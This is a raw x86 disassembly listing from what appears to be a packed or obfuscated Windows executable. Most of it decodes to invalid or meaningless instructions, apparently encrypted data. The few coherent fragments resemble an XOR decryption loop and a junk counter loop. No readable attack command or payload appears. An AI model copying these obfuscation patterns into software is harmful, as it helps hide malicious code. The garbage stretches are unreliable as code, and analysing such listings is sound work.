  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x72
  4030ce:	cmp    eax,0x17fc3939
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x2f70707e
  4030da:	repz sub DWORD PTR [esi-0x29],edx
  4030de:	jg     0x40312d
  4030e0:	(bad)  
  4030e1:	in     al,0xc8
  4030e3:	adc    ebp,DWORD PTR [ecx-0x168ad69e]
  4030e9:	jle    0x403125
  4030eb:	push   0x19013c7
  4030f0:	push   esi
  4030f1:	nop
  4030f2:	dec    edx
  4030f3:	repnz and al,0x1d
  4030f6:	push   ebp
  4030f7:	iret   
  4030f8:	sbb    DWORD PTR [eax],eax
  4030fa:	sar    DWORD PTR [ebx+0x77],1
  4030fd:	lds    ebx,FWORD PTR [edx+0x137da62e]
  403103:	push   ebp
  403104:	xchg   esp,eax
  403105:	cmp    edx,edi
  403107:	das    
  403108:	loopne 0x40310d
  40310a:	sar    DWORD PTR [edx+eiz*1],0x59
  40310e:	mov    bh,0x6b
  403110:	pop    ss
  403111:	push   cs
  403112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403113:	enter  0x9659,0x9e
  403117:	xchg   ebp,eax
  403118:	adc    al,0xaa
  40311a:	and    BYTE PTR cs:[edx-0x3daa5e03],ah
  403121:	scas   al,BYTE PTR es:[edi]
  403122:	std    
  403123:	out    0x28,eax
  403125:	xchg   esi,eax
  403126:	adc    eax,0xc97d5c62
  40312b:	aam    0xd0
  40312d:	not    BYTE PTR [edi-0x12ce5843]
  403133:	int    0x5f
  403135:	xchg   ebp,eax
  403137:	or     al,0x8a
  403139:	add    cl,BYTE PTR [edi]
  40313b:	mov    esi,0xb89f78ed
  403140:	aam    0x4f
  403142:	out    0xd,al
  403144:	push   esi
  403145:	neg    BYTE PTR [ecx-0x80]
  403148:	add    DWORD PTR [edi-0x65e1749b],0xffffffe5
  40314f:	add    BYTE PTR ds:0xde5d5ef0,dl
  403155:	imul   DWORD PTR [esi-0x49]
  403158:	(bad)  
  403159:	fucomp st(1)
  40315b:	int3   
  40315c:	lock sbb BYTE PTR [ebp+ebx*2-0x1c18fbd3],dh
  403164:	(bad)  
  403166:	inc    edx
  403167:	pop    ebx
  403168:	pop    ebp
  403169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40316a:	(bad)  
  40316b:	and    dh,BYTE PTR [ecx-0x5]
  40316e:	sahf   
  40316f:	adc    dh,bl
  403171:	jne    0x40312e
  403173:	mov    cl,0x59
  403175:	(bad)  
  403176:	dec    ebx
  403177:	inc    edx
  403178:	bnd jmp 0xfa5e041
  40317e:	pop    edi
  40317f:	scas   eax,DWORD PTR es:[edi]
  403180:	mov    al,0xf4
  403182:	jnp    0x403127
  403184:	and    ch,0xf2
  403187:	and    BYTE PTR [edx],cl
  403189:	mov    ebx,0xe714aa69
  40318e:	xchg   ebp,eax
  40318f:	loopne 0x40312d
  403191:	add    eax,0x2ea442f0
  403196:	mov    edx,0x34c45286
  40319b:	cdq    
  40319c:	imul   edx,DWORD PTR [ebp+0x16],0x39593fd9
  4031a3:	dec    edx
  4031a4:	cmp    BYTE PTR [ebp+0x684c320e],0x80
  4031ab:	sbb    eax,0xe6117c5c
  4031b0:	ret    0x88dc
  4031b3:	out    dx,eax
  4031b4:	fimul  DWORD PTR [edx]
  4031b6:	push   edi
  4031b7:	loop   0x403198
  4031b9:	adc    BYTE PTR [edi],bh
  4031bb:	lods   eax,DWORD PTR ds:[esi]
  4031bc:	mov    bl,0x12
  4031be:	iret   
  4031bf:	retf   
  4031c0:	gs xchg ebx,eax
  4031c2:	mov    dh,dl
  4031c4:	xlat   BYTE PTR ds:[ebx]
  4031c5:	call   0x9343:0x562e7297
  4031cc:	pop    eax
  4031cd:	loope  0x4031f3
  4031cf:	pushf  
  4031d0:	rcr    DWORD PTR [ebx-0x75960009],cl
  4031d6:	mov    ch,0x54
  4031d8:	dec    eax
  4031d9:	out    0xaa,al
  4031db:	imul   edx,DWORD PTR [ecx+0x7e],0x3f
  4031df:	jbe    0x4031f5
  4031e1:	mov    ebx,0x1fb7ef6e
  4031e6:	mul    dh
  4031e8:	adc    eax,0x8d5ffd2
  4031ed:	les    edi,FWORD PTR [ebp-0x644a411a]
  4031f3:	xor    DWORD PTR [edx+0x22],edx
  4031f6:	jbe    0x403213
  4031f8:	push   edi
  4031f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031fa:	push   edi
  4031fb:	and    ecx,DWORD PTR [edx+edi*1]
  4031fe:	xor    al,0x27
  403200:	ins    BYTE PTR es:[edi],dx
  403201:	loope  0x403248
  403203:	adc    BYTE PTR [ecx-0x76f09fdc],bl
  403209:	xor    al,cl
  40320b:	ficomp WORD PTR [ebp-0x9]
  40320e:	dec    ebp
  40320f:	jl     0x40325c
  403211:	push   0x19
  403213:	jne    0x403205
  403215:	sub    bl,BYTE PTR [eax+0x6df20f08]
  40321b:	stos   DWORD PTR es:[edi],eax
  40321c:	cmp    DWORD PTR [ecx-0x7e],ebp
  40321f:	cmp    eax,0x57ded1e6
  403224:	retf   
  403225:	dec    ebp
  403226:	dec    ebp
  403227:	hlt    
  403228:	push   es
  403229:	pusha  
  40322a:	imul   esi,DWORD PTR [ebx+0x2bf6af31],0x5e
  403231:	test   BYTE PTR [esi+eax*4],bh
  403234:	xchg   ecx,eax
  403235:	addr16 ds enter 0x7827,0x15
  40323b:	repz sbb eax,DWORD PTR [edx+ebp*2+0xa]
  403240:	cs dec esi
  403242:	mov    ds:0xeb8a4f1f,al
  403247:	test   al,0xf9
  403249:	popf   
  40324a:	lea    ebx,[esi-0x52]
  40324d:	dec    DWORD PTR [ecx]
  40324f:	mov    bl,ch
  403251:	ss inc edx
  403253:	xchg   ch,dl
  403255:	and    dh,BYTE PTR [esi+0x61]
  403258:	push   eax
  40325a:	push   0x67
  40325c:	mov    ds:0x6037acdd,eax
  403261:	mov    dl,0x26
  403263:	in     eax,0xe0
  403265:	xchg   edi,eax
  403266:	(bad)  
  403267:	xchg   edi,eax
  403268:	lods   eax,DWORD PTR ds:[si]
  40326a:	and    eax,0x34cd60f9
  40326f:	jp     0x403258
  403271:	(bad)  
  403272:	aam    0xc5
  403274:	xor    bl,dl
  403276:	outs   dx,DWORD PTR ds:[esi]
  403277:	jae    0x4032c5
  403279:	inc    edx
  40327a:	es dec edx
  40327c:	je     0x4032ae
  40327e:	jae    0x403245
  403280:	sahf   
  403281:	repz fst QWORD PTR [edx+0x50]
  403285:	out    0x6a,eax
  403287:	or     bh,BYTE PTR [ebp-0x1701d73c]
  40328d:	mov    dh,0xae
  40328f:	nop
  403290:	pop    eax
  403291:	and    BYTE PTR [esi+eiz*2+0x18],dl
  403295:	push   ebp
  403296:	mov    ebx,0x769100c4
  40329b:	add    ch,cl
  40329d:	cmp    DWORD PTR [edi-0x17],0xd9d4bca6
  4032a4:	in     al,0x23
  4032a6:	sbb    bl,BYTE PTR [edx+0x52067f5f]
  4032ac:	cs pop edi
  4032ae:	jbe    0x403230
  4032b0:	xchg   ebx,eax
  4032b1:	xor    BYTE PTR [ebx-0x7d],ch
  4032b4:	adc    BYTE PTR [edx-0x3f],0x9f
  4032b8:	mov    ah,0x2f
  4032ba:	loopne 0x40332a
  4032bc:	les    ecx,FWORD PTR [ebx]
  4032be:	loop   0x403327
  4032c0:	mov    dl,0x2d
  4032c2:	mov    eax,0x19483169
  4032c7:	std    
  4032c8:	cmp    bh,BYTE PTR [ebp-0xd59be80]
  4032ce:	dec    esi
  4032cf:	sub    dh,BYTE PTR [edi]
  4032d1:	loope  0x4032bc
  4032d3:	push   esi
  4032d4:	push   es
  4032d5:	mov    ebp,0x602c4b9a
  4032da:	xchg   ebx,eax
  4032db:	and    al,0x5f
  4032dd:	mov    al,ds:0x560d4863
  4032e2:	push   0x8990f279
  4032e7:	pusha  
  4032e8:	iret   
  4032e9:	sub    BYTE PTR [edi],dh
  4032eb:	test   DWORD PTR [eax],0x7ffdd5d0
  4032f1:	jno    0x403319
  4032f3:	xor    ebp,esp
  4032f5:	cmp    esi,DWORD PTR [esi+0x6de83891]
  4032fb:	sbb    dh,dl
  4032fd:	push   es
  4032fe:	call   0xd0ed5728
  403303:	pop    es
  403304:	ss enter 0xd62b,0x33
  403309:	jns    0x4032a0
  40330b:	outs   dx,DWORD PTR ds:[esi]
  40330c:	jmp    0x93d8:0xd20193f0
  403313:	out    0x42,eax
  403315:	jno    0x4032c6
  403317:	sbb    eax,0xf9ef129c
  40331c:	pushf  
  40331d:	repz (bad) 
  40331f:	aad    0x82
  403321:	in     eax,0x78
  403323:	adc    eax,edi
  403325:	xor    esp,esp
  403327:	add    eax,0x5409e737
  40332c:	xlat   BYTE PTR ds:[ebx]
  40332d:	jbe    0x4032c6
  40332f:	fcom   QWORD PTR [ecx]
  403331:	jmp    DWORD PTR [esp+eiz*4]
  403334:	pop    es
  403335:	or     al,0xfe
  403337:	cld    
  403338:	jnp    0x4032ba
  40333a:	xchg   ebx,eax
  40333b:	lock push 0x71e3a389
  403341:	and    BYTE PTR ds:0xee87cfef,ch
  403347:	jp     0x4033c2
  403349:	jo     0x4033c9
  40334b:	pop    edi
  40334c:	inc    edx
  40334d:	cmp    eax,0xa7a515ef
  403352:	imul   edx,DWORD PTR [ecx],0xbdc66a90
  403358:	in     al,dx
  403359:	movq   mm5,QWORD PTR [esp+ebx*4+0x6c]
  40335e:	ja     0x403326
  403360:	mov    dh,0x1e
  403362:	out    0x3b,eax
  403364:	fstp   QWORD PTR [ebx+edi*8+0x60]
  403368:	jge    0x4033ad
  40336a:	mov    bl,0xbb
  40336c:	dec    edx
  40336d:	repz aaa 
  40336f:	xor    al,0x92
  403371:	not    BYTE PTR fs:[ecx+ecx*1-0x64bfa39c]
  403379:	test   eax,0xb63cde98
  40337e:	or     al,0xbd
  403380:	jecxz  0x4033ac
  403382:	loope  0x4033c6
  403384:	xor    al,0xc5
  403386:	mov    ds:0x56e37329,al
  40338b:	les    ebp,FWORD PTR [eax+0x5160a502]
  403391:	mov    ds:0x640f7f36,al
  403396:	mov    dl,0xe6
  403398:	push   edi
  403399:	sti    
  40339a:	mov    esi,DWORD PTR gs:[ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	aad    0xf4
  4033bb:	push   esp
  4033bc:	ins    BYTE PTR es:[edi],dx
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403366
  4033c6:	in     al,0x21
  4033c8:	jbe    0x403404
  4033ca:	sbb    ebx,DWORD PTR ds:[ebp+0x6c]
  4033ce:	push   esp
  4033cf:	xor    BYTE PTR [ecx],ch
  4033d1:	push   esi
  4033d2:	jp     0x403447
  4033d4:	xor    eax,ebx
  4033d6:	daa    
  4033d7:	test   DWORD PTR [esi],ebx
  4033d9:	retf   0x9789
  4033dc:	adc    al,0xc
  4033de:	mov    eax,0xd8081f1a
  4033e3:	or     BYTE PTR [esi+ecx*4-0x212aa13d],al
  4033ea:	mov    ebp,0x96bfc870
  4033ef:	pop    edx
  4033f0:	fucomip st,st(2)
  4033f2:	out    dx,eax
  4033f3:	cwde   
  4033f4:	push   ds
  4033f5:	push   cs
  4033f6:	cld    
  4033f7:	and    al,BYTE PTR [edi]
  4033f9:	loop   0x40341d
  4033fb:	sbb    al,0xc8
  4033fd:	push   edx
  4033fe:	inc    eax
  4033ff:	adc    al,0xd8
  403401:	mov    al,ds:0x2d6ab64
  403406:	sub    DWORD PTR [edx],ebx
  403408:	xlat   BYTE PTR ds:[ebx]
  403409:	add    esp,DWORD PTR [edx]
  40340b:	cld    
  40340c:	loop   0x403450
  40340e:	ret    0x8d26
  403411:	scas   al,BYTE PTR es:[edi]
  403412:	xor    BYTE PTR [ecx-0x41],0x67
  403416:	rcl    BYTE PTR ds:0xd8d613fd,1
  40341c:	mov    DWORD PTR [ebp+0x3c],ecx
  40341f:	sbb    al,0xb6
  403421:	pmaxub mm6,QWORD PTR [ebx]
  403424:	add    eax,0x96f4b841
  403429:	cmp    BYTE PTR [edx],ch
  40342b:	sbb    ebp,eax
  40342d:	push   0xd919780d
  403432:	cli    
  403433:	push   0x14
  403435:	push   eax
  403436:	rcl    bh,cl
  403438:	mov    esp,0x1c18ca65
  40343d:	mov    esi,0x48ab4e51
  403442:	dec    ebx
  403443:	ja     0x40344f
  403445:	dec    ebp
  403446:	out    dx,al
  403447:	mov    edx,0x33b5e0f5
  40344c:	cmp    esi,DWORD PTR [edi]
  40344e:	mov    ecx,0x2abc2e6
  403453:	out    dx,al
  403454:	icebp  
  403455:	sbb    al,0xf3
  403457:	imul   edi,DWORD PTR [edi+0xd],0x2be72b14
  40345e:	ror    bh,cl
  403460:	into   
  403461:	add    eax,0x81402105
  403466:	dec    edi
  403467:	stc    
  403468:	fidiv  WORD PTR [edx-0x47ce7dd4]
  40346e:	xchg   BYTE PTR [ecx+0x78431618],al
  403474:	pop    edi
  403475:	sar    BYTE PTR [edi-0x1a7ca795],cl
  40347b:	int    0xe4
  40347d:	fld    DWORD PTR [edx-0x7e9c8fb1]
  403483:	ficom  WORD PTR [edi+eiz*1-0x103f3f13]
  40348a:	mov    ch,0x44
  40348c:	outs   dx,BYTE PTR ds:[esi]
  40348d:	inc    ebp
  40348e:	or     dh,0x56
  403491:	pushf  
  403492:	test   ah,al
  403494:	xor    edx,DWORD PTR [ebx-0x59]
  403497:	imul   esp,DWORD PTR [edx-0x4709cda6],0x6a
  40349e:	jecxz  0x403443
  4034a0:	cmp    DWORD PTR [ebp+0x6f16dfbf],ebx
  4034a6:	jo     0x4034df
  4034a8:	test   BYTE PTR ds:0xa6bf9eb6,bh
  4034ae:	sbb    esp,DWORD PTR [esi]
  4034b0:	fiadd  DWORD PTR [ebx-0x7b]
  4034b3:	in     al,0x41
  4034b5:	outs   dx,DWORD PTR ds:[esi]
  4034b6:	pushf  
  4034b7:	pop    ebp
  4034b8:	aam    0xb9
  4034ba:	test   eax,0x465ee9bd
  4034bf:	or     ebx,DWORD PTR [ecx+ecx*8+0x539ae244]
  4034c6:	popa   
  4034c7:	add    BYTE PTR [edi*4-0x1f51e4ef],dl
  4034ce:	sub    BYTE PTR [ebx+eax*1],cl
  4034d1:	xor    dh,BYTE PTR [esi-0x2d]
  4034d4:	popf   
  4034d5:	jge    0x4034d9
  4034d7:	retf   
  4034d8:	dec    esp
  4034d9:	mov    ds,WORD PTR [ebp+0x10894467]
  4034df:	scas   eax,DWORD PTR es:[edi]
  4034e0:	pop    edx
  4034e1:	out    0x5,eax
  4034e3:	fbstp  TBYTE PTR [edi]
  4034e5:	cwde   
  4034e6:	iret   
  4034e7:	cmp    ecx,DWORD PTR [edi]
  4034e9:	adc    DWORD PTR [edi],esp
  4034eb:	and    eax,0x649a809
  4034f0:	or     DWORD PTR [esp+eiz*8],eax
  4034f3:	push   ss
  4034f4:	mov    WORD PTR [esi-0x5a],ss
  4034f7:	cli    
  4034f8:	adc    eax,0xb9bc2451
  4034fd:	or     ah,BYTE PTR [edx-0xd]
  403500:	sub    al,0xd2
  403502:	pop    ebx
  403503:	xchg   edi,eax
  403504:	rcr    bl,1
  403506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403507:	inc    esp
  403508:	xchg   BYTE PTR [ebx+0x4c],dl
  40350b:	sbb    eax,0x3fb1359
  403510:	mov    edx,DWORD PTR [edx+0x3c21e8b1]
  403516:	xor    edi,ecx
  403518:	push   esp
  403519:	inc    edi
  40351a:	fistp  QWORD PTR [edx-0x33]
  40351d:	or     ecx,DWORD PTR [edx-0x28]
  403520:	mov    edi,0x30c9b5
  403525:	and    BYTE PTR [ebx+0x64],ch
  403528:	jmp    0x403579
  40352a:	pop    ecx
  40352b:	sbb    eax,0x7d719e6c
  403530:	jmp    0x16e58136
  403535:	aaa    
  403536:	cmp    ah,BYTE PTR [edx]
  403538:	jb     0x403508
  40353a:	test   eax,0xe9e9d5e2
  40353f:	add    DWORD PTR [ebp-0x256634b1],ebp
  403545:	pop    ebx
  403546:	jp     0x4035b6
  403548:	pushw  es
  40354a:	push   ebx
  40354b:	pop    ds
  40354c:	outs   dx,DWORD PTR ds:[esi]
  40354d:	push   ss
  40354e:	shl    edi,0x38
  403551:	loopne 0x4035ad
  403553:	dec    edi
  403554:	inc    esi
  403555:	push   edx
  403556:	and    BYTE PTR ss:[eax-0x134c0292],0x41
  40355e:	dec    esp
  40355f:	push   es
  403560:	daa    
  403561:	add    dh,BYTE PTR [eax+ebp*1-0x14]
  403565:	mov    ecx,0x2bf07764
  40356a:	push   esi
  40356b:	xchg   edi,eax
  40356c:	mov    al,ds:0x9e2c9105
  403571:	fmul   DWORD PTR [esp+ebx*1-0xb]
  403575:	adc    dl,ch
  403577:	adc    ecx,esp
  403579:	fcom   DWORD PTR fs:[edi+0x33583759]
  403580:	push   0xa924a494
  403585:	xchg   ebx,esp
  403587:	jp     0x403559
  403589:	mov    esp,0x6fbc05fc
  40358e:	(bad)  
  40358f:	push   edi
  403590:	push   esp
  403591:	add    al,BYTE PTR [edx]
  403593:	adc    DWORD PTR [ecx-0x7b],eax
  403596:	adc    eax,0xc42c84d9
  40359b:	and    DWORD PTR [edi+0x5b],esi
  40359e:	mov    ch,0xfd
  4035a0:	int    0x93
  4035a2:	mov    esp,0x2dfa6add
  4035a7:	mov    dl,0xeb
  4035a9:	sbb    al,0xb6
  4035ab:	or     DWORD PTR [ebx-0x51],ecx
  4035ae:	fsub   QWORD PTR [edi]
  4035b0:	jbe    0x403592
  4035b2:	mov    dh,0xea
  4035b4:	aam    0xe9
  4035b6:	out    0x57,al
  4035b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b9:	hlt    
  4035ba:	add    BYTE PTR [edx],bl
  4035bc:	and    esp,ebx
  4035be:	ret    
  4035bf:	int    0xe6
  4035c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035c2:	lahf   
  4035c3:	add    esi,DWORD PTR [eax+0x11db3a1c]
  4035c9:	(bad)  
  4035ca:	out    dx,al
  4035cb:	xlat   BYTE PTR ds:[ebx]
  4035cc:	call   0xc3f4:0xabe88a12
  4035d3:	mov    ebx,0x280175c3
  4035d8:	leave  
  4035d9:	xlat   BYTE PTR ds:[ebx]
  4035da:	mov    al,0x71
  4035dc:	xchg   BYTE PTR [ebp+0x1f],bh
  4035df:	add    al,0x2a
  4035e1:	leave  
  4035e2:	push   eax
  4035e3:	jno    0x4035ab
  4035e5:	mov    edx,0xbc170082
  4035ea:	inc    edx
  4035eb:	push   esp
  4035ec:	ins    BYTE PTR es:[edi],dx
  4035ed:	xor    eax,eax
  4035ef:	aas    
  4035f0:	inc    ebx
  4035f1:	jns    0x4035e0
  4035f3:	sub    DWORD PTR [edx],ebx
  4035f5:	ja     0x4035e9
  4035f7:	shl    eax,1
  4035f9:	fucomp st(4)
  4035fb:	paddsb mm4,mm6
  4035fe:	stos   DWORD PTR es:[edi],eax
  4035ff:	hlt    
  403600:	jp     0x40358a
  403602:	es pop eax
  403604:	mov    WORD PTR [ecx],ss
  403606:	cmp    esp,DWORD PTR [edi-0x330c4fb8]
  40360c:	hlt    
  40360d:	cmp    BYTE PTR [edx-0x21],cl
  403610:	stc    
  403611:	aaa    
  403612:	ror    DWORD PTR [esi+eax*4],0xc4
  403616:	das    
  403617:	pusha  
  403618:	push   edx
  403619:	dec    ebx
  40361a:	jecxz  0x4035c0
  40361c:	pop    ecx
  40361d:	dec    esp
  40361e:	ins    DWORD PTR es:[edi],dx
  40361f:	int3   
  403620:	(bad)  
  403621:	pop    ebp
  403622:	lods   eax,DWORD PTR ds:[esi]
  403623:	cwde   
  403624:	inc    ebp
  403625:	fisttp DWORD PTR [ebx+eax*4-0x30]
  403629:	or     ebx,DWORD PTR [ecx+esi*1+0x5efefcc1]
  403630:	ficomp WORD PTR [esi-0x36]
  403633:	ret    0x2318
  403636:	bnd jo 0x403646
  403639:	mov    WORD PTR [esi],ss
  40363b:	add    eax,DWORD PTR [esi+0x733c914a]
  403641:	sahf   
  403642:	pop    es
  403643:	(bad)  
  403644:	js     0x403678
  403646:	loope  0x403626
  403648:	loope  0x4036ad
  40364a:	ds push es
  40364c:	std    
  40364d:	pop    esi
  40364e:	cld    
  40364f:	inc    ecx
  403650:	cmp    dl,dh
  403652:	and    DWORD PTR [ebx-0x38],ecx
  403655:	push   cs
  403656:	call   0x5b7c:0xa873553
  40365d:	lds    edx,FWORD PTR [ecx+0xb]
  403660:	cwde   
  403661:	outs   dx,BYTE PTR ds:[esi]
  403662:	push   ds
  403663:	out    0x46,eax
  403665:	mov    ebp,0x90542d00
  40366a:	dec    esp
  40366b:	sbb    DWORD PTR [edi],edi
  40366d:	mov    ds:0x36e63da,eax
  403672:	mov    ds:0xdcb578b,al
  403677:	push   ecx
  403678:	jno    0x4036c5
  40367a:	out    0x74,al
  40367c:	test   al,0x23
  40367e:	lods   al,BYTE PTR ds:[esi]
  40367f:	mov    ebp,0x356dc021
  403684:	xchg   DWORD PTR [edx+0x3848a8a],edi
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR ds:0x78c0f5d5,edx
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0xe770707d
  4037ae:	jae    0x40378e
  4037b0:	push   ecx
  4037b1:	bound  esi,QWORD PTR [ecx]
  4037b3:	mov    ds:0xfc38064f,al
  4037b8:	sti    
  4037b9:	pop    ecx
  4037ba:	jbe    0x403778
  4037bc:	jae    0x40374f
  4037be:	test   eax,esi
  4037c0:	pop    es
  4037c1:	fs jl  0x4037d5
  4037c4:	stc    
  4037c5:	push   ebx
  4037c6:	fs pop ss
  4037c8:	retf   0x599f
  4037cb:	push   eax
  4037cc:	std    
  4037cd:	loopne 0x4037e5
  4037cf:	adc    cl,BYTE PTR [ebx-0x5721210a]
  4037d5:	jecxz  0x403825
  4037d7:	mov    al,0x5e
  4037d9:	sbb    BYTE PTR [edi+0x553378f2],bl
  4037df:	dec    eax
  4037e0:	out    0xbc,al
  4037e2:	and    DWORD PTR [ebx],0x98201862
  4037e8:	loopne 0x40385e
  4037ea:	clc    
  4037eb:	dec    edx
  4037ec:	stc    
  4037ed:	adc    ecx,edi
  4037ef:	gs push 0x8b67aac2
  4037f5:	out    dx,eax
  4037f6:	int    0x7d
  4037f8:	inc    eax
  4037f9:	sub    esi,DWORD PTR [eax-0x7061037d]
  4037ff:	sbb    al,0xa3
  403801:	ja     0x403788
  403803:	cmc    
  403804:	push   edx
  403805:	pop    ebx
  403806:	ret    0xcf6a
  403809:	pop    ebp
  40380a:	sbb    BYTE PTR [eax],0xe8
  40380d:	daa    
  40380e:	ret    
  40380f:	retf   0xd3c1
  403812:	std    
  403813:	cmp    eax,DWORD PTR [esp+edx*8+0x1eb03c9f]
  40381a:	(bad)
  40381d:	push   es
  40381e:	pop    ebx
  40381f:	push   edi
  403820:	adc    al,0x7f
  403822:	repnz fstp QWORD PTR [esp+eax*4]
  403826:	into   
  403827:	test   eax,0x11fbbff2
  40382c:	out    dx,al
  40382d:	or     BYTE PTR [edx+0xbc78ef0],dh
  403833:	cmp    al,0xe9
  403835:	add    eax,0xdf29f45
  40383a:	dec    ebx
  40383b:	jb     0x403830
  40383d:	out    0x26,al
  40383f:	mov    eax,ds:0x2452a46e
  403844:	sub    DWORD PTR [ebx-0x3302a45c],0x38
  40384b:	cs xor ebp,ebx
  40384e:	(bad)  
  403850:	dec    eax
  403851:	fstp   TBYTE PTR [eax+edi*2+0x7525fea1]
  403858:	add    ecx,DWORD PTR [eax-0x2bb89414]
  40385e:	sahf   
  40385f:	xlat   BYTE PTR ds:[ebx]
  403860:	mul    BYTE PTR [eax-0x17]
  403863:	or     bl,BYTE PTR [ebp+0x2e]
  403866:	xchg   esp,eax
  403867:	and    BYTE PTR gs:[edi],bl
  40386a:	rol    BYTE PTR [ebx+0x6a],0x1a
  40386e:	stc    
  40386f:	cld    
  403870:	sbb    esi,DWORD PTR [ebx-0x5086223]
  403876:	cs jns 0x40382b
  403879:	fsincos 
  40387b:	(bad)  
  40387c:	cmp    dh,BYTE PTR [eax-0x3daf8417]
  403882:	out    dx,eax
  403883:	mov    esi,0x799f2577
  403888:	leave  
  403889:	arpl   di,dx
  40388b:	stos   BYTE PTR es:[edi],al
  40388c:	das    
  40388d:	xchg   esi,eax
  40388e:	sub    DWORD PTR [eiz*8-0x1c0648c],ebp
  403895:	out    dx,eax
  403896:	jno    0x40388e
  403898:	stos   BYTE PTR es:[edi],al
  403899:	jo     0x4038c9
  40389b:	add    esi,DWORD PTR [eax]
  40389d:	xchg   al,bl
  40389f:	les    ebx,FWORD PTR [ecx+0x5d]
  4038a2:	call   0x7d3a389c
  4038a7:	add    BYTE PTR [edi+0x3c],0x72
  4038ab:	xchg   esp,eax
  4038ac:	mov    ds:0x4dcf52d3,al
  4038b1:	ss pop ecx
  4038b3:	imul   BYTE PTR [ebp-0x51]
  4038b6:	out    0x29,al
  4038b8:	mov    BYTE PTR [edi],bl
  4038ba:	pop    ds
  4038bb:	fcmove st,st(0)
  4038bd:	lods   al,BYTE PTR ds:[esi]
  4038be:	nop
  4038bf:	mov    ebp,0x67ef0344
  4038c4:	fst    st(2)
  4038c6:	test   edi,ebp
  4038c8:	mov    al,0x2f
  4038ca:	sub    DWORD PTR [edi],edi
  4038cc:	retf   0x963f
  4038cf:	mov    ch,BYTE PTR [ecx+ebp*4+0x4a]
  4038d3:	bound  edi,QWORD PTR [ecx]
  4038d5:	mov    edx,0xee0a1e85
  4038da:	ret    0x5e4e
  4038dd:	xchg   BYTE PTR [edi-0x75],cl
  4038e0:	adc    DWORD PTR ds:0x5c83a70f,0xcac92d27
  4038ea:	xchg   ebx,eax
  4038eb:	inc    eax
  4038ec:	xchg   ebx,eax
  4038ed:	mov    ch,0xf4
  4038ef:	fwait
  4038f0:	push   ebp
  4038f1:	dec    ebp
  4038f2:	push   esi
  4038f3:	stos   DWORD PTR es:[edi],eax
  4038f4:	dec    esi
  4038f5:	sbb    esi,DWORD PTR [eax+eiz*4]
  4038f8:	scas   al,BYTE PTR es:[edi]
  4038f9:	mov    DWORD PTR [edx],edi
  4038fb:	pop    edi
  4038fc:	and    cl,BYTE PTR [esi-0x30]
  4038ff:	add    ecx,0xfffffff1
  403902:	shl    BYTE PTR [eax-0x176684b],cl
  403908:	into   
  403909:	add    ecx,DWORD PTR [ecx]
